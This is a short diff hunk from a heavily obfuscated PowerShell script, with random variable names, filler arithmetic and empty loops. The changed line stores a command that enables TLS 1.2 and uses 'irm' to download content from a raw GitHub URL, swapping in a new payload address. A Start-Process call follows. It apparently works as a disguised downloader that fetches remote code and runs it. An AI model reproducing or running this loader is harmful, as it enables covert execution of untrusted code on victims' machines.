@@ -721,7 +721,7 @@ $E9vD0 = 84 * 307 + 68
 $wQUBvpj0Iq = [Math]::Abs($E9vD0 - 4617)
 $cwTXqkGQfBVw6nAGm = [Math]::Max($E9vD0, $wQUBvpj0Iq) - [Math]::Min($E9vD0, $wQUBvpj0Iq)
 [void]$cwTXqkGQfBVw6nAGm
-$vXyu20 = '[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; irm https://github.com/frantario/raprapugr/blob/main/3jpt47-384'
+$vXyu20 = '[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; irm https://raw.githubusercontent.com/frantario/raprapugr/refs/heads/main/ruta87-12'
 
         foreach ($BfFxf in @()) { $eIqgNew = 3939 }
 Start-Process -FilePath $x9_1sx3O_avt -ArgumentList @(
